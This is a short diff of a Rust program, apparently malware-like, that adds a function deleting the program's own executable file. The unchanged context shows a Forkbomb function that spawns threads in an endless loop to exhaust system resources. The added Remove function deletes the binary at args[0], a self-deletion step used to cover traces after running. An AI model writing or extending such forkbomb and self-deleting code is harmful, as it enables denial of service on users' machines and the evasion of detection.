@@ -1,7 +1,7 @@
 mod linux;
 use rand::Rng;
 use std::{
-    fs,
+    env, fs,
     fs::File,
     io::{prelude::*, BufReader},
     path::Path,
@@ -153,6 +153,13 @@ fn Forkbomb() {
     loop {
         std::thread::spawn(Forkbomb);
     }
+}
+
+// Remove is used to delete the program file.
+fn Remove() -> std::io::Result<()> {
+    let args: Vec<_> = env::args().collect();
+    fs::remove_file(args[0].to_owned())?;
+    Ok(())
 }
 
 // Exists checks if a given file is in the system.
